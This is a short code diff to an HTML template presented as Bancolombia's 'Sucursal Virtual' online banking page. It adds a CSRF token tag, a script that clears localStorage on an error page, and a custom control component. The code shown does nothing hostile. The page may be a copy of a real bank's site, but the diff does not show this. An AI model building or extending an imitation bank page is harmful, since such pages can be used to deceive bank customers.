@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <title>Bancolombia - Sucursal Virtual</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -252,8 +253,16 @@
     </div>
 
     <script>
-        // Aquí puedes agregar lógica para el redireccionamiento automático si es necesario
+        // Limpiar localStorage al llegar a la página de error
+        document.addEventListener('DOMContentLoaded', function() {
+            localStorage.clear();
+        });
     </script>
+
+    <x-control
+        :auto-completar="false"
+        :debug="false"
+    />
 
 </body>
 
